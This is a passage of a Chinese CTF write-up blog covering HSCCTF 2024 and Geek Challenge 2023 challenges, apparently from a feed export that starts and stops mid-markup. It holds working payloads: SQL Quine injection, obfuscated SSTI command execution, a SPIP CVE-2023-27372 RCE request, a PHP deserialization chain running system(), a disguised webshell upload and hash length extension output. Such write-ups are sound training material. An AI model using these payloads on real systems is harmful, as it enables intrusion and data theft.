class="string">&quot;2024&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>参考 ImaginaryCTF Round 28 - Filter Master，预期是构造filter链生成所需字符串。</p><p>非预期：</p><p>传入 <code>resource=data:,2024&lt;|string.strip_tags|</code>，利用PHP通过简单识别 <code>|</code> 作为filter分割字符来选择filter的特性。</p><p>payload：</p><p>POST <code>1=resource=data:,2024&lt;|string.strip_tags|</code></p><p>​    </p><h3 id="PWD"><a href="#PWD" class="headerlink" title="PWD"></a>PWD</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;ccut&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waffff</span>(<span class="params"><span class="variable">$sql</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/infor|sys|sql|thread|case|when|if|like|left|right|mid|cmp|sub|locate|position|match|find|field|sleep|repeat|lock|bench|process|&lt;|&gt;|=|xor|and|&amp;&amp;|\\\\/i&quot;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">waffff</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>要求输入的password参数值等于系统的password值，利用union select实现输入和输出内容一致，Quine注入。</p><p>POST: </p><p><code>password=1&#39;UNION(SELECT(REPLACE(REPLACE(&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;,CHAR(34),CHAR(39)),CHAR(37),&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;)))#</code></p><p>​    </p><h3 id="TMPL"><a href="#TMPL" class="headerlink" title="TMPL"></a>TMPL</h3><p>SSTI漏洞，限制了部分字符，用fenjing解决。</p><p>payload：</p><p><code>&#123;&#123;g|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*3)%(112,111,112))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*11)%(95,95,103,108,111,98,97,108,115,95,95))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*11)%(95,95,103,101,116,105,116,101,109,95,95))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*12)%(95,95,98,117,105,108,116,105,110,115,95,95))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*11)%(95,95,103,101,116,105,116,101,109,95,95))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*10)%(95,95,105,109,112,111,114,116,95,95))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*2)%(111,115))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*5)%(112,111,112,101,110))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*9)%(99,97,116,32,47,102,108,97,103))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*4)%(114,101,97,100))()&#125;&#125;</code></p><p>​    </p><h3 id="SHIROSHORTMENSHELL"><a href="#SHIROSHORTMENSHELL" class="headerlink" title="SHIROSHORTMENSHELL"></a>SHIROSHORTMENSHELL</h3><p>使用shiro攻击工具shiro_attack-4.5.2-SNAPSHOT-all.jar，找到key：<code>kPH+bIxk5D2deZiIxcaaaA==</code>，再用cb1链打通getshell即可。</p><p>​    </p><h3 id="DESERIALIZATION"><a href="#DESERIALIZATION" class="headerlink" title="DESERIALIZATION"></a>DESERIALIZATION</h3><p>SPIP CMS &lt;v4.2.1 反序列化RCE漏洞（CVE-2023-27372）</p><p>参考：<a href="https://www.cnblogs.com/spmonkey/p/17550492.html">【漏洞复现】CVE-2023-27372 RCE漏洞</a></p><p>列目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /spip.php?page=spip_pass</span><br><span class="line"></span><br><span class="line">page=spip_pass&amp;formulaire_action=oubli&amp;formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&amp;formulaire_action_sign=&amp;oubli=s:21:&quot;&lt;?=system(&#x27;ls /&#x27;); ?&gt;&quot;;&amp;nobot=</span><br></pre></td></tr></table></figure><p>读文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /spip.php?page=spip_pass HTTP/1.1</span><br><span class="line"></span><br><span class="line">page=spip_pass&amp;formulaire_action=oubli&amp;formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&amp;formulaire_action_sign=&amp;oubli=s:25:&quot;&lt;?=system(&#x27;uniq /f*&#x27;); ?&gt;&quot;;&amp;nobot=</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="LOG"><a href="#LOG" class="headerlink" title="LOG"></a>LOG</h3><blockquote><p>Hint: 同学发给我一个网址<a href="https://x.x.x.x/?md5=9c80d2bb0bccfefeb3750744c0760496&amp;applicant=admin&amp;filename=web.log，说让我帮忙看看网站运行日志，同学说这是他写的一个非常安全方便的文件查看器。">https://x.x.x.x/?md5=9c80d2bb0bccfefeb3750744c0760496&amp;applicant=admin&amp;filename=web.log，说让我帮忙看看网站运行日志，同学说这是他写的一个非常安全方便的文件查看器。</a> 真的安全吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$secret</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;SECRETKEY&quot;</span>); <span class="comment"># For security reasons, the key length is greater than 8.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;md5&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;applicant&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;md5&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$_GET</span>[<span class="string">&quot;applicant&quot;</span>].<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$file_contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file_contents</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;My tool is safe.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>哈希长度扩展攻击。</p><p>已知secret位数大于8，已知明文 <code>adminweb.log</code>，已知md5 hash=9c80d2bb0bccfefeb3750744c0760496，扩展字符 <code>/flag</code>。</p><p>利用脚本爆破secret位数，尝试到15的时候成功获取flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python3 hash_ext_attack.py                                                  </span><br><span class="line">2024-03-10 08:17:33.714 | DEBUG    | common.md5_manual:__init__:17 - init......</span><br><span class="line">请输入已知明文：adminweb.log</span><br><span class="line">请输入已知hash： 9c80d2bb0bccfefeb3750744c0760496</span><br><span class="line">请输入扩展字符: /flag</span><br><span class="line">请输入密钥长度：15</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:69 - 已知明文：b&#x27;adminweb.log&#x27;</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:70 - 已知hash：b&#x27;9c80d2bb0bccfefeb3750744c0760496&#x27;</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:72 - 新明文：b&#x27;adminweb.log\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x00\x00\x00\x00\x00\x00\x00/flag&#x27;</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:73 - 新明文(url编码)：adminweb.log%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D8%00%00%00%00%00%00%00%2Fflag</span><br><span class="line">2024-03-10 08:27:02.695 | INFO     | __main__:run:75 - 新hash:46879013726bfb7dff6921fd2e9ab2f8</span><br></pre></td></tr></table></figure><p>payload：</p><p><code>GET /?md5=46879013726bfb7dff6921fd2e9ab2f8&amp;applicant=adminweb.log%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D8%00%00%00%00%00%00%00&amp;filename=/flag</code></p><p>​    </p><h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="NICE-RIVER"><a href="#NICE-RIVER" class="headerlink" title="NICE_RIVER"></a>NICE_RIVER</h3><p>百度识图，识别大桥为琶洲大桥，根据方位定位到保利天幕广场员工停车场：<code>HSCCTF&#123;23.10393,113.38363&#125;</code>。</p><p>​    </p><h3 id="город"><a href="#город" class="headerlink" title="город"></a>город</h3><p>google识图，找到<a href="https://wikimapia.org/4495454/Olonkho-shopping-centre">https://wikimapia.org/4495454/Olonkho-shopping-centre</a></p><p>定位为Olonkho shopping centre，定位点：<code>HSCCTF&#123;62.03716,129.73620&#125;</code></p><p>​    </p><h3 id="CAR"><a href="#CAR" class="headerlink" title="CAR"></a>CAR</h3><p>截取楼的部分百度识图，识别出为渝州宾馆。</p><p>小红书里搜索渝州宾馆，看到一张清晰的图片，正对的是渝州宾馆黄山厅，左边是大堂。</p><p>结合百度和google卫星视图看，得到定位点：<code>HSCCTF&#123;29.53201,106.50045&#125;</code>。</p><p>​    </p><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><p>搜索关键词：圣彼得堡+广场+船锚，找到相关图片：<a href="https://www.huitu.com/photo/show/20190424/162434930070.html。">https://www.huitu.com/photo/show/20190424/162434930070.html。</a></p><p>定位为圣彼得堡瓦西里岛古港口，定位点：<code>HSCCTF&#123;59.94387,30.30595&#125;</code>。</p><p>​    </p><h3 id="CITY"><a href="#CITY" class="headerlink" title="CITY"></a>CITY</h3><p>百度识图，找到米漾米居酒店，地址：<code>HSCCTF&#123;山东省菏泽市牡丹区黄巢路7号&#125;</code>。</p><p>​    </p><h2 id="BLOCKCHAIN"><a href="#BLOCKCHAIN" class="headerlink" title="BLOCKCHAIN"></a>BLOCKCHAIN</h2><h3 id="BONUS"><a href="#BONUS" class="headerlink" title="BONUS"></a>BONUS</h3><blockquote><p><strong>年终奖</strong></p><p>坏消息：公司只给你发了一张超市的会员卡作为年终奖<br>好消息：余额有114514元<br>坏消息：只能用来购买一块钱的糖，一次只能买一个<br>好消息：余额只剩1元时可以获得名为flag的神秘大奖<br>兑奖地址：nc xx.xx.xx.xx xxxx</p><p>智能合约部署网络为Polygon Mumbai<br>地址为：0xB2e3926c8F1eb762e0eb3844026A8Fd8fF5A311a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//contract.sol</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract VipCard &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function applyCard() public &#123;</span><br><span class="line">        balances[msg.sender] = 114514;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function topUp(uint _amount) public &#123;</span><br><span class="line">        balances[msg.sender] += _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buyCandy() public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt; 0, &quot;not sufficient funds&quot;);</span><br><span class="line">        balances[msg.sender] -= 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>非预期，进入区块链浏览器PolygonScan查看地址0xB2e3926c8F1eb762e0eb3844026A8Fd8fF5A311a的<a href="https://mumbai.polygonscan.com/address/0xB2e3926c8F1eb762e0eb3844026A8Fd8fF5A311a">交易记录</a>，输入输入已完成题目要求的选手的地址即可。</p><p>预期解应该是uint上溢出漏洞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;本届HSCCTF 2024是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖WEB、CRYPTO、MISC、PWN、REVERSE、OSINT等主流方向，并面向全球开放。&lt;/p&gt;
&lt;p&gt;&lt;st</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2024赛" scheme="https://lazzzaro.github.io/tags/2024%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>Geek Challenge 2023</title>
    <link href="https://lazzzaro.github.io/2023/11/27/match-Geek-Challenge-2023/"/>
    <id>https://lazzzaro.github.io/2023/11/27/match-Geek-Challenge-2023/</id>
    <published>2023-11-27T10:28:02.000Z</published>
    <updated>2024-03-31T10:02:56.254Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>第十四届极客大挑战 GEEK CHALLENGE 2023‼️<br>开放注册：10月25日晚10点<br>比赛时间：10月26日晚8点-11月26日晚8点<br>平台链接：<a href="https://game.sycsec.com/">https://game.sycsec.com/</a><br>赛题范围包括re，web，pwn，crypto，misc等等，本届赛题还加入全新yak语言元素，方向多样，趣味性高。<br>本届更增添校外排行榜，校外的同学们组队参与也能获得名次奖励，欢迎大家前来挑战 💪。</p><p><strong>Rank: 3</strong></p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="EzHttp"><a href="#EzHttp" class="headerlink" title="EzHttp"></a>EzHttp</h3><blockquote><p>http签到，点击就送flag <a href="http://1.117.175.65:23333/">http://1.117.175.65:23333/</a></p></blockquote><p><code>robots.txt</code> 获取账号密码，再按步骤用几个请求头字段绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 1.117.175.65:23333</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Referer: sycsec.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">via: Syc.vip</span><br><span class="line">O2TAKUXX: GiveMeFlag</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 40</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=@dm1N123456r00t#</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h3><blockquote><p>来签个到吧先</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable language_">$this</span>-&gt;cuit;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable language_">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable language_">$this</span>-&gt;interesting);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">web</span>:</span><br><span class="line">    public_eva1=<span class="string">&#x27;system&#x27;</span></span><br><span class="line">    public_interesting=<span class="string">&#x27;cat /f*&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lover</span>:</span><br><span class="line">    public_yxx=web()</span><br><span class="line">    public_QW=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">syc</span>:</span><br><span class="line">    public_cuit=lover()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(serialize(syc()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:2:&quot;QW&quot;;s:1:&quot;x&quot;;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:6:&quot;system&quot;;s:11:&quot;interesting&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>POST：</p><p><code>url=O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:2:&quot;QW&quot;;s:1:&quot;x&quot;;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:6:&quot;system&quot;;s:11:&quot;interesting&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;</code></p><p>​    </p><h3 id="n00b-Upload"><a href="#n00b-Upload" class="headerlink" title="n00b_Upload"></a>n00b_Upload</h3><p>文件上传绕过：MIME、图片头、绕关键字</p><p>构造请求头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a&lt;?=system($_GET[x]);</span><br></pre></td></tr></table></figure><p>上传成功后，访问 <code>uploadtest/378845_653a63ea1370a.php?x=cat /flag</code> 拿flag。</p><p>​    </p><h3 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h3><blockquote><p>学了php了，那就来看看这些绕过吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>])&amp;&amp;<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^Welcome to GEEK 2023!$/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;syc&#x27;</span>] !== <span class="string">&#x27;Welcome to GEEK 2023!&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lover&#x27;</span>]) &lt; <span class="number">2023</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lover&#x27;</span>] + <span class="number">1</span>) &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qw&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;yxx&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$array1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;qw&#x27;</span>];</span><br><span class="line">            <span class="variable">$array2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;yxx&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$array1</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$array2</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SYC_GEEK.2023&#x27;</span>])&amp;&amp;(<span class="variable">$_POST</span>[<span class="string">&#x27;SYC_GEEK.2023&#x27;</span>]=<span class="string">&quot;Happy to see you!&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span 